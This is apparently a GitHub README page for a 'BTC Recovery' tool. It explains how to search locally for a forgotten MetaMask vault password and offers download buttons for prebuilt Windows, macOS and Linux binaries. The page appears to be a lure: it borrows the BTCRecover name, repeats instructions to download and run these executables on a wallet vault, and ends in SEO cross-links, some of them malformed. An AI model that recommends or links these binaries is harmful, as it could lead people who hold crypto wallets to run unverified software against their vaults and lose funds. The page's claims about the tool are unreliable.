<div align="center">
<img src="assets/banner-article.png" alt="MetaMask vault password recovery">
</div>

# MetaMask vault password recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A MetaMask wallet is a vault file inside your browser profile, encrypted with the password you set on that device. The password can be searched locally, the vault needs no phrase to open, and the phrase is only needed when the vault itself is gone.

## You'll see this if

The extension is installed but will not unlock, or the vault survived a reinstall while the password did not. The states are distinct and only one of them needs a search.

| What you see | What it means | Where to go |
|---|---|---|
| "Incorrect password" in the extension | the vault is present and the password is wrong | here |
| The extension was reinstalled and asks to import | the vault is gone; only the phrase can restore | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| Unlock works, but the phrase is what you have lost | the vault is fine and the password is known | read the phrase from the app's settings |
| A vault file from an old browser profile, no password | the artifact this page is about | here |
| The phrase restores an empty account | wrong account index or network | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) |

## Why it happens

The vault is a small encrypted JSON file in the extension's storage, unlocked by a password that never leaves your device. There is no MetaMask account server holding it, no reset email and no support route that recovers it  -  the file and the password are the whole system, which is exactly why a local search works.

The phrase sits behind the password rather than beside it. Anyone with the vault and the password can read the phrase; anyone with the phrase needs no vault at all. So a lost password with the vault intact is a searchable problem, and a lost vault with the phrase intact is a five-minute restore. The case with neither is the one with no route.

A third state confuses people: a fresh install with the same phrase shows a different account because the account index differs, or because the wrong network is selected. That is not a loss and not a password problem  -  it is the derivation question, and it is answered by comparing addresses.

One more state is easy to miss: several browser profiles means several vaults. Each browser keeps its own extension storage, so installing the wallet a second time produces a new, empty vault with a new password, while the wallet you remember may sit in the profile you stopped using. Check every profile on every browser on every machine the wallet was used on before concluding a vault is gone.

## Fix

Establish which of the three you have  -  vault plus forgotten password, phrase without a vault, or a vault that opens but shows an unfamiliar account  -  then take that route only.

1. **Copy the browser profile** before anything else. The vault lives in the extension's storage inside the profile directory; a copy means a failed attempt cannot damage the only artifact.
2. **Confirm the vault is really there.** An extension that offers to import rather than unlock has no vault left, and the phrase is then the only route: [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md).
3. **Write down what you remember about the password**  -  approximate length, whether it was a sentence, numbers that could be years, capitalisation, and whether the keyboard was different at the time. MetaMask enforces a minimum length, so very short candidates can be ruled out.
4. **Turn that into candidate rules** and run them offline against a copy of the vault: [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md).
5. **Download the current release from the GitHub releases page** and point it at the vault file with the candidate list: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Verify by unlocking**, then export the phrase deliberately and store it offline. A recovered password on a browser vault is not a permanent arrangement.
7. **Move long-term holdings out of a browser wallet** to something with a device or an offline key, and keep the browser wallet for small amounts.

## If that did not work

A run that finishes empty on a vault is usually a rules problem rather than a missing vault, because the file is small and the encryption is exactly what it claims to be.

Re-read the candidate list for what it excludes: a required digit, a fixed length, a capital letter the password never had. If the password may have been a sentence, a passphrase-style rule with spaces and punctuation is a better fit than a short-password rule. If the vault came from a browser profile you copied years ago and the extension version differed, the storage path can hold more than one vault  -  check for a second file before concluding.

The honest limit: a long random password leaves nothing to enumerate, and no service can supply it. In that case the phrase is the route, and if the phrase is also gone the wallet is unreachable: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md). Where the phrase exists but the vault does not, the recovery is a restore, not a search.

## Prevention

- Store the vault password in a manager, and keep that manager's recovery code offline.
- Write the phrase on paper or metal; never in a cloud note or a screenshot: [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md).
- Record the account index if more than one account was used.
- Keep a backup of the browser profile only if you also keep the password  -  otherwise the vault is noise.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### How do I recover my MetaMask password?

Search it locally against a copy of the vault, using remembered fragments as rules. If the seed phrase is available, restoring that into a fresh install is faster and does not need the password at all.

### I lost my MetaMask phrase but still have the password. What can I do?

Unlock the extension and read the phrase from its settings, then store it offline immediately. The vault is intact and nothing is lost  -  but do this before the browser profile is cleared or the device fails.

### Can I recover my MetaMask seed phrase without the password?

Not from the vault, because the phrase is encrypted inside it. If the phrase is genuinely gone and the vault is gone, no tool can rebuild it: the phrase is the wallet, and the vault was only a copy of it.

### Does MetaMask have a reset I can use?

No. There is no account server and no recovery email; resetting the extension deletes the vault. A reset is only safe when you hold the phrase, because the phrase is what makes the wallet restorable afterwards.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Seed phrase storage]([Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md))
- [You shared your seed phrase]([You shared your seed phrase: what is recoverable](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-shared-seed-phrase.md))
